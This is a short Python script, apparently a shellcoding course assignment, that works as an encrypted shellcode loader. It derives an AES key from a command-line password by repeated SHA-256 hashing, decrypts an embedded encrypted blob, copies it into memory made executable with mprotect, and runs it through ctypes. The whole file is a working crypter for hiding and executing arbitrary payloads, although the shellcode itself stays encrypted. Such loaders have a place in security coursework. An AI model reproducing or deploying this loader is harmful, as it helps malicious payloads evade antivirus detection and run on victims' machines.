#!/usr/bin/python
# Author: Robert Taylor
# http://a41l4.blogspot.ca/2017/03/assignment-7.html
import os
import sys
from Crypto.Cipher import AES
import hashlib
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
from sys import argv

libc = CDLL('libc.so.6')
my_ciphered=("\x8f\xe5\xee\x3f\x34\x31\x9d\xba\xc3\x87\x9b\x2d\x21\x73\x25\xf6\x64\xf5\xd4\x42\x97\x93\xb8\x45\x82\x53\xb5\x67\x56\x78\xeb\x2f\x91\x10\x9e\x07\x24\x0e\x78\x1f\xe4\x38\xff\x5a\x98\xb6\x85\x61\x87\x54\xaf\xc5\x0a\xa7\xe5\xb7\xb6\xd4\x09\xcf\x30\x88\x18\xd0\xcc\xcc\xef\xb7\xfb\xd6\x96\x3d\x97\x71\x74\x32\x61\x30\x58\x28\x3d\x35\x60\x48\x92\x9d\xdf\x7c\x72\xf0\x0b\x01\xaf\x7d\x47\xc4")
password=''
BLOCK_SIZE=16
IV=''
my_deciphered = ''

def prnt(stuff):
    """ Print strings to stdout without automatically outputing a
        terminating line feed or space.
    """
    sys.stdout.write(stuff)

def print_array(array):
    """ Print the bytearray """
    for x in bytearray(array):
        prnt('\\x%02x' %x)
    prnt('\n')

def hash_password():
    """ Hash the password. """
    global password
    try:
        password = hashlib.sha256(sys.argv[1]).digest()
        try:
            for i in range(30000):
                password = hashlib.sha256(password + str(i) + sys.argv[1]).digest()
        except:
            print("Something is wrong with your hashing loop")
            sys.exit()
    except:
	print("Please enter your password as the first argument to the script")
        sys.exit()

def decrypt():
    """ Decrypt the shellcode. R.T. """
    global my_deciphered
    IV = my_ciphered[:BLOCK_SIZE]
    obj = AES.new(password, AES.MODE_CBC, IV)
    my_deciphered = obj.decrypt(my_ciphered[BLOCK_SIZE:])

def execute():
    """ Execute the deciphered code """
    code = c_char_p(my_deciphered)
    size = len(my_deciphered)
    addr = c_void_p(libc.valloc(size))
    memmove(addr, code, size)
    libc.mprotect(addr, size, 0x7)
    run = cast(addr, CFUNCTYPE(c_void_p))
    run()

def main():
    hash_password()
    decrypt()
    #print_array(my_deciphered)
    execute()

# Standard boilerplate to call the main() function to begin
# the program. Helps to avoid calling main if this file is imported to another program.
if __name__ == '__main__':
    main()






